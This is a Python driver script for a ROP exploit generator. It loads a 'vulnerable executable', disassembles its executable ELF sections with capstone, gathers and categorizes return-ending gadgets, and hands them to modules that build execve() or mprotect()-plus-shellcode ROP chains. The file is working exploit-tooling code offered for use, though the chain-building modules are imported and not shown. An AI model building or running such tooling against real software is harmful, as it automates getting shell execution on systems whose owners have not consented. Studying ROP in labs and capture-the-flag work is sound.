#!/usr/bin/python3

# This is the driver file. 

from capstone import *
from argparse import ArgumentParser
from elftools.elf.elffile import ELFFile

import get_gadgets  
import categorize
import chain
import print_pretty
import general

import execveChain
import mprotectChain


if __name__ == "__main__": 

    parser = ArgumentParser()
    parser.add_argument("-f", "--file", dest="filename",
                        help="vulnerable executable", metavar="FILE")
    parser.add_argument("-l", "--length", dest="length",
                        help="Max number of bytes to traverse above c3", metavar="NUM")

    parser.add_argument("-e", "--exploitType", dest="exploitType", metavar="EXPLOITTYPE")

    parser.add_argument("-g", "--gadgets", dest="gadgets", action='store_true')

    args = parser.parse_args()

    if(args.filename == None):
        print("Use the --file or -f flags to enter the vulnerable executable!")
        exit(1)

    if(args.length == None):
        print("Use the --length or -l flag to enter the max number of bytes to traverse above c3!")
        exit(1)

    if(args.gadgets == False):
        if(args.exploitType == None): 
            print("Use the --exploitType flag to enter the type of exploit you need. ")
            print("There are 2 types of exploit as of now: ")
            print("1. 'execve' : Standard execve() ROP shellcode")
            print("2. 'mprotect' : mprotect() ROP Shellcode combined with execve traditional shellcode")
            exit(1)


    vulnExecutable = str(args.filename)

    gadgetLength = int(args.length)

    with open(vulnExecutable, 'rb') as fd:
        elffile = ELFFile(fd)
        print("Searching all executable sections....")
        for section in elffile.iter_sections():
            curr_code = elffile.get_section_by_name(section.name)
            if(curr_code['sh_flags'] & 4): # only if the first bit of sh_flags is set, is the section executable and we can collect gadgets from here
                print("Searching the " + section.name + " section")
                section_name = section.name
                code = elffile.get_section_by_name(section_name)
                opcodes = code.data()
                addr = code['sh_addr'] # section header address
                # print('Entry Point: '+ str(hex(elffile.header['e_entry'])))
                EntryAddress = addr # elffile.header['e_entry']
                md = Cs(CS_ARCH_X86, CS_MODE_64)
                instructions = md.disasm(opcodes,addr)
                ins = md.disasm(opcodes[0], addr)
            
                if instructions == 0:
                    print("Unable to disassemble executable")
                    exit(1)
                
                get_gadgets.GetAllGadgets(instructions, code.data(), EntryAddress, get_gadgets.SpecialInstructions,gadgetLength)

    if args.gadgets == True:
        print_pretty.print_pretty(get_gadgets.allGadgets)


    TwoInstGadgets = categorize.getLNGadgets(get_gadgets.allGadgets, 2)

    general.ALLGADGETS = categorize.categorize(TwoInstGadgets)


    # execve() ROP Shellcode
    if args.exploitType == "execve" : 
        execveChain.execveROPChain(general.ALLGADGETS, vulnExecutable)
    
    # mprotect() ROP Shellcode + execve() traditional Shellcode
    elif args.exploitType == "mprotect" : 
        mprotectChain.mprotectROPChain(general.ALLGADGETS, vulnExecutable)
    
    # If we don't have the exploit
    else: 
        print("We support the following exploits: ")
        print("1. 'execve' : Standard execve() ROP shellcode")
        print("2. 'mprotect' : mprotect() ROP Shellcode combined with execve traditional shellcode")
        exit(1)